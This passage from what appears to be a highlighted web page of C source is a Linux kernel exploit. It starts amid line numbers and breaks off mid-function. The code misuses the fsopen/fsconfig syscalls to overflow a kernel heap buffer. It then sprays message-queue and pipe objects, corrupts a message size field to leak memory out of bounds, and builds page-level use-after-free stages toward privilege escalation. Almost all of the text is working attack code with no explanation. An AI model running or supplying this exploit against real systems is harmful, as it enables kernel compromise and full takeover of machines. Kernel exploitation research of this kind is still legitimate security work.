class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_NOERROR     010000  <span class="hljs-comment">/* no error if message is too big */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgget 186</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgsnd 189</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_msgget</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_msgrcv 188</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">int</span> fs_fd;                 <span class="hljs-comment">/* using by filesystem */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>	 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_msg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgflg)</span>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf *)msgp)-&gt;mtype = msgflg;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">copy_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_for_overwrite</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Opening the ext4 filesystem&quot;</span>);<br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Opening&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">186</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SZ (0x1000 - 0x30 + 0x20 - 0x8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OOB_READ_SZ (0x2000 - 0x30 - 0x8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE 0x41414141</span><br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> msqid[MSG_SPRAY_NR];<br><span class="hljs-type">int</span> victim_qidx = <span class="hljs-number">-1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">occupy_4k_obj_by_msg</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> pat[<span class="hljs-number">0x100</span>];<br>    info_log(<span class="hljs-string">&quot;Step I:Construct the first page uaf...&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocating the pipe...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocating the pipe failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocating the msg_queue and msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_SPRAY_NR - <span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>((msqid[i] = get_msg()) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocating the msg_queue failed!&quot;</span>);<br>        &#125;<br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ/<span class="hljs-number">8</span>] = i;<br>        <span class="hljs-keyword">if</span>(send_msg(msqid[i], buf, MSG_SZ, MSG_TYPE))&#123;<br>            error_log(<span class="hljs-string">&quot;Write the msg failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    prepare_for_overwrite();<br>    <span class="hljs-built_in">memset</span>(pat, <span class="hljs-string">&#x27;\x42&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pat));<br>    pat[<span class="hljs-number">21</span>] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, pat, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = MSG_SPRAY_NR - <span class="hljs-number">8</span>; i &lt; MSG_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>((msqid[i] = get_msg()) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocating the msg_queue failed!&quot;</span>);<br>        &#125;<br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ/<span class="hljs-number">8</span>] = i;<br>        <span class="hljs-type">int</span> ret = send_msg(msqid[i], buf, MSG_SZ, MSG_TYPE); <br>        <span class="hljs-keyword">if</span>(send_msg(msqid[i], buf, MSG_SZ, MSG_TYPE))&#123;<br>            error_log(<span class="hljs-string">&quot;Write the msg failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Trying to overwrite the msg_msg-&gt;m_ts...&quot;</span>);<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;\xc8\x1f&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Trying to make an oob read...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_SPRAY_NR; i++)&#123;<br>        <span class="hljs-type">int</span> read_sz = copy_msg(msqid[i], buf, OOB_READ_SZ, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(read_sz &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;read msg failed!&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(read_sz &gt; MSG_SZ)&#123;<br>            victim_qidx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_qidx == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;failed to find the victim_qidx!&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]We found the victim_msq_queue_idx\033[0m:%d\n&quot;</span>, victim_qidx);<br>&#125;<br><br><span class="hljs-type">int</span> victim_pid = <span class="hljs-number">-1</span>, orig_pid;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_first_uaf</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    info_log(<span class="hljs-string">&quot;Step II:Construct the first page level uaf&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]We need to free the msg_msg except the corrupted one!&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(recv_msg(msqid[i], buf, MSG_SZ, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;unlink the msg_msg failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span>*<span class="hljs-number">64</span>) &lt; <span class="hljs-number">0</span>)&#123;     <span class="hljs-comment">/* pipe_buffers is 64*0x28 */</span><br>            error_log(<span class="hljs-string">&quot;realloc pipe failed...&quot;</span>);<br>        &#125;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiadhao&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiadhao&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiadhao&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Overflow the pipe_buffers by one null byte...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">185</span>; i++)&#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-type">char</span> tmp[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br>        <br>        <span class="hljs-keyword">if</span>(i == victim_qidx)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(read(pipe_fd[i][<span class="hljs-number">0</span>], tmp, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;read pipe failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;read pipe failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(tmp, <span class="hljs-string">&quot;peiadhao&quot;</span>)&amp;&amp; nr != i)&#123;<br>            orig_pid = i;<br>            victim_pid = nr;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;failed to find the uaf one!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]We found the victim_pid:%d, original_pid:%d\033[0m\n&quot;</span>, victim_pid, orig_pid);<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_PIPE_BUF_SZ 96</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buffer</span>;</span><br><span class="hljs-type">int</span> victim_second_pid = <span class="hljs-number">-1</span>, orig_second_pid;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_second_uaf</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> second_pipe_sz = <span class="hljs-number">0x1000</span> * (SECOND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-type">size_t</span> pipe_buf[<span 